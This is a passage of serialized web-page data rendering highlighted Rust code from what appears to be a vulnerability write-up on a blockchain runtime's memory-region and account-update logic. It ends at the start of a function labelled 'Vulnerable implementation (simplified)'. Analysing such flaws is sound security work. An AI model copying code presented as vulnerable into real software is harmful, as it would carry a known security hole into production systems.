react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[13]}]\n7c4:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n7c5:[\"$\",\"span\",\"code-segment-114\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\n7c6:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7c7:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n7c8:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7c9:[\"$\",\"span\",\"code-segment-118\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}]\n7ca:[\"$\",\"span\",\"code-segment-119\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n7cb:[\"$\",\"span\",\"code-segment-120\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\n7cc:[\"$\",\"span\",\"code-segment-121\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n7cd:[\"$\",\"span\",\"code-segment-122\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7ce:[\"$\",\"span\",\"code-segment-123\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n7cf:[\"$\",\"span\",\"code-segment-124\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7d0:[\"$\",\"span\",\"code-segment-125\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99"])</script><script>self.__next_f.push([1,"cd\"},\"children\":[\"self\"]}]\n7d1:[\"$\",\"span\",\"code-segment-126\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n7d2:[\"$\",\"span\",\"code-segment-127\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"find_region\"]}]\n7d3:[\"$\",\"span\",\"code-segment-128\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n7d4:[\"$\",\"span\",\"code-segment-129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cache\"]}]\n7d5:[\"$\",\"span\",\"code-segment-130\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n7d6:[\"$\",\"span\",\"code-segment-131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}]\n7d7:[\"$\",\"span\",\"code-segment-132\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n7d8:[\"$\",\"span\",\"code-segment-133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7d9:[\"$\",\"span\",\"code-segment-134\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n7da:[\"$\",\"span\",\"code-segment-135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n7db:[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[14]}]\n7dc:[\"$\",\"span\",\"code-segment-137\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n7dd:[\"$\",\"span\",\"code-segment-138\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\n7de:[\"$\",\"span\",\"code-segment-139\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7df:[\"$\",\"span\",\"code-segment-140\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n7e0:[\"$\",\"span\",\"code-segment-141\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\n7e1:[\"$\",\"span\",\"code-segment-142\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n7e2:[\"$\",\"span\",\"code-segment-143\",{\"className\":\"$undefined\",\"style\":{}"])</script><script>self.__next_f.push([1,",\"children\":[\"vm_addr\"]}]\n7e3:[\"$\",\"span\",\"code-segment-144\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"..\"]}]\n7e4:[\"$\",\"span\",\"code-segment-145\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\n7e5:[\"$\",\"span\",\"code-segment-146\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n7e6:[\"$\",\"span\",\"code-segment-147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_addr_end\"]}]\n7e7:[\"$\",\"span\",\"code-segment-148\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n7e8:[\"$\",\"span\",\"code-segment-149\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n7e9:[\"$\",\"span\",\"code-segment-150\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"contains\"]}]\n7ea:[\"$\",\"span\",\"code-segment-151\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n7eb:[\"$\",\"span\",\"code-segment-152\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n7ec:[\"$\",\"span\",\"code-segment-153\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_addr\"]}]\n7ed:[\"$\",\"span\",\"code-segment-154\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n7ee:[\"$\",\"span\",\"code-segment-155\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n7ef:[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[15]}]\n7f0:[\"$\",\"span\",\"code-segment-157\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n7f1:[\"$\",\"span\",\"code-segment-158\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}]\n7f2:[\"$\",\"span\",\"code-segment-159\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7f3:[\"$\",\"span\",\"code-segment-160\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n7f4:[\"$\",\"span\",\"code-segment-161\",{\"className\""])</script><script>self.__next_f.push([1,":\"$undefined\",\"style\":{},\"children\":[\"access_type \"]}]\n7f5:[\"$\",\"span\",\"code-segment-162\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}]\n7f6:[\"$\",\"span\",\"code-segment-163\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7f7:[\"$\",\"span\",\"code-segment-164\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccessType\"]}]\n7f8:[\"$\",\"span\",\"code-segment-165\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n7f9:[\"$\",\"span\",\"code-segment-166\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Load\"]}]\n7fa:[\"$\",\"span\",\"code-segment-167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7fb:[\"$\",\"span\",\"code-segment-168\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"||\"]}]\n7fc:[\"$\",\"span\",\"code-segment-169\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n7fd:[\"$\",\"span\",\"code-segment-170\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"ensure_writable_region\"]}]\n7fe:[\"$\",\"span\",\"code-segment-171\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n7ff:[\"$\",\"span\",\"code-segment-172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\n800:[\"$\",\"span\",\"code-segment-173\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n801:[\"$\",\"span\",\"code-segment-174\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n802:[\"$\",\"span\",\"code-segment-175\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n803:[\"$\",\"span\",\"code-segment-176\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n804:[\"$\",\"span\",\"code-segment-177\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n805:[\"$\",\"span\",\"code-segment-178\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cow_cb\"]}]\n806:[\"$\",\"span\",\"code-segment-179\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n807:[\"$\",\"span\",\"code-segment-180\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]"])</script><script>self.__next_f.push([1,"\n808:[\"$\",\"span\",\"code-segment-181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n809:[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[16]}]\n80a:[\"$\",\"span\",\"code-segment-183\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n80b:[\"$\",\"span\",\"code-segment-184\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n80c:[\"$\",\"span\",\"code-segment-185\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n80d:[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[17]}]\n80e:[\"$\",\"span\",\"code-segment-187\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n80f:[\"$\",\"span\",\"code-segment-188\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"return\"]}]\n810:[\"$\",\"span\",\"code-segment-189\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n811:[\"$\",\"span\",\"code-segment-190\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}]\n812:[\"$\",\"span\",\"code-segment-191\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n813:[\"$\",\"span\",\"code-segment-192\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}]\n814:[\"$\",\"span\",\"code-segment-193\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n815:[\"$\",\"span\",\"code-segment-194\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n816:[\"$\",\"span\",\"code-segment-195\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n817:[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"st"])</script><script>self.__next_f.push([1,"yle\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[18]}]\n818:[\"$\",\"span\",\"code-segment-197\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n819:[\"$\",\"span\",\"code-segment-198\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n81a:[\"$\",\"span\",\"code-segment-199\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n81b:[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[19]}]\n81c:[\"$\",\"span\",\"code-segment-201\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n81d:[\"$\",\"span\",\"code-segment-202\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n81e:[\"$\",\"span\",\"code-segment-203\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n81f:[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[20]}]\n820:[\"$\",\"span\",\"code-segment-205\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n821:[\"$\",\"span\",\"code-segment-206\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Err\"]}]\n822:[\"$\",\"span\",\"code-segment-207\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n823:[\"$\",\"span\",\"code-segment-208\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"generate_access_violation\"]}]\n824:[\"$\",\"span\",\"code-segment-209\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n825:[\"$\",\"span\",\"code-segment-210\",{\"className\":\"token t"])</script><script>self.__next_f.push([1,"oken\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}]\n826:[\"$\",\"span\",\"code-segment-211\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n827:[\"$\",\"span\",\"code-segment-212\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"config\"]}]\n828:[\"$\",\"span\",\"code-segment-213\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n829:[\"$\",\"span\",\"code-segment-214\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" access_type\"]}]\n82a:[\"$\",\"span\",\"code-segment-215\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n82b:[\"$\",\"span\",\"code-segment-216\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}]\n82c:[\"$\",\"span\",\"code-segment-217\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n82d:[\"$\",\"span\",\"code-segment-218\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n82e:[\"$\",\"span\",\"code-segment-219\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}]\n82f:[\"$\",\"span\",\"code-segment-220\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n830:[\"$\",\"span\",\"code-segment-221\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n831:[\"$\",\"span\",\"code-segment-222\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}]\n832:[\"$\",\"span\",\"code-segment-223\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n833:[\"$\",\"span\",\"code-segment-224\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n834:[\"$\",\"span\",\"code-segment-225\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"unwrap_err\"]}]\n835:[\"$\",\"span\",\"code-segment-226\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n836:[\"$\",\"span\",\"code-segment-227\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n837:[\"$\",\"span\",\"code-segment-228\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n838:[\"$\",\"span\",\"code-segment-229\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n839:[\"$\",\"span\",\"line-numb"])</script><script>self.__next_f.push([1,"er--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[21]}]\n83a:[\"$\",\"span\",\"code-segment-231\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n83b:[\"$\",\"span\",\"code-segment-232\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n83c:[\"$\",\"span\",\"code-segment-233\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n83d:[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[22]}]\n83e:[\"$\",\"span\",\"code-segment-235\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n83f:[\"$\",\"span\",\"code-segment-236\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n840:[\"$\",\"span\",\"code-segment-237\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n841:[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[23]}]\n842:[\"$\",\"span\",\"code-segment-239\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n843:[\"$\",\"span\",\"code-segment-240\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n844:[\"$\",\"span\",\"code-segment-241\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n845:[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(2"])</script><script>self.__next_f.push([1,"55,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[24]}]\n846:[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[25]}]\n847:[\"$\",\"span\",\"code-segment-245\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n848:[\"$\",\"span\",\"code-segment-246\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Vulnerable implementation (simplified)\"]}]\n849:[\"$\",\"span\",\"code-segment-247\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n84a:[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[26]}]\n84b:[\"$\",\"span\",\"code-segment-249\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n84c:[\"$\",\"span\",\"code-segment-250\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}]\n84d:[\"$\",\"span\",\"code-segment-251\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n84e:[\"$\",\"span\",\"code-segment-252\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"update_caller_account\"]}]\n84f:[\"$\",\"span\",\"code-segment-253\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n850:[\"$\",\"span\",\"code-segment-254\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n851:[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[27]}]\n852:[\"$\",\"span\",\"code-segment-256\",{\"className\":\"$undefined\",\"style\":{},\"children\":["])</script><script>self.__next_f.push([1,"\"    invoke_context\"]}]\n853:[\"$\",\"span\",\"code-segment-257\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n854:[\"$\",\"span\",\"code-segment-258\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n855:[\"$\",\"span\",\"code-segment-259\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n856:[\"$\",\"span\",\"code-segment-260\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"InvokeContext\"]}]\n857:[\"$\",\"span\",\"code-segment-261\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n858:[\"$\",\"span\",\"code-segment-262\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n859:[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[28]}]\n85a:[\"$\",\"span\",\"code-segment-264\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    memory_mapping\"]}]\n85b:[\"$\",\"span\",\"code-segment-265\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n85c:[\"$\",\"span\",\"code-segment-266\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n85d:[\"$\",\"span\",\"code-segment-267\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n85e:[\"$\",\"span\",\"code-segment-268\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n85f:[\"$\",\"span\",\"code-segment-269\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n860:[\"$\",\"span\",\"code-segment-270\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryMapping\"]}]\n861:[\"$\",\"span\",\"code-segment-271\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n862:[\"$\",\"span\",\"code-segment-272\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n863:[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\""])</script><script>self.__next_f.push([1,",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[29]}]\n864:[\"$\",\"span\",\"code-segment-274\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    is_loader_deprecated\"]}]\n865:[\"$\",\"span\",\"code-segment-275\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n866:[\"$\",\"span\",\"code-segment-276\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n867:[\"$\",\"span\",\"code-segment-277\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}]\n868:[\"$\",\"span\",\"code-segment-278\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n869:[\"$\",\"span\",\"code-segment-279\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n86a:[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[30]}]\n86b:[\"$\",\"span\",\"code-segment-281\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    caller_account\"]}]\n86c:[\"$\",\"span\",\"code-segment-282\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n86d:[\"$\",\"span\",\"code-segment-283\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n86e:[\"$\",\"span\",\"code-segment-284\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n86f:[\"$\",\"span\",\"code-segment-285\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n870:[\"$\",\"span\",\"code-segment-286\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n871:[\"$\",\"span\",\"code-segment-287\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}]\n872:[\"$\",\"span\",\"code-segment-288\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n873:[\"$\",\"span\",\"code-segment-289\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n874:[\"$\",\"span"])</script><script>self.__next_f.push([1,"\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[31]}]\n875:[\"$\",\"span\",\"code-segment-291\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    callee_account\"]}]\n876:[\"$\",\"span\",\"code-segment-292\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n877:[\"$\",\"span\",\"code-segment-293\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n878:[\"$\",\"span\",\"code-segment-294\",{\"className\":\"token 